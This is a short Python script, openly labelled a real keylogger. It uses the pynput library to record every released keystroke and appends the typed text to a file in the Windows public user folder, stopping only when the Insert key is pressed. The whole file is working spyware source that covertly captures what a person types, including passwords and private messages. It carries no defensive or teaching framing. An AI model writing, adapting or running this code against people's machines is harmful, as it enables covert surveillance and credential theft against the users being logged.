from pynput.keyboard import Key, Listener

# Space for store keys
keys = []
count = 0

# Append pressed keys to array
def logging(key):
    global keys, count
    if key == Key.insert:
        return False
    else:
        if key == Key.enter:
            write(keys)
            count = 0
            keys = []
        elif key == Key.space:
            key = ''
            write(keys)
            keys = []
            count = 0
        keys.append(key)
        count += 1


# Open file and write logged keys
def write(keys):
    with open('c:/Users/Public/KeyLog.txt', 'a') as file:
        for key in keys:
            key = str(key).replace("'", "")
            
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write('\n')


# Execute Keylogger file
# Caution: THIS IS REAL KEYLOGGER PROGRAM!!!
with Listener(on_release=logging) as listener:
    listener.join()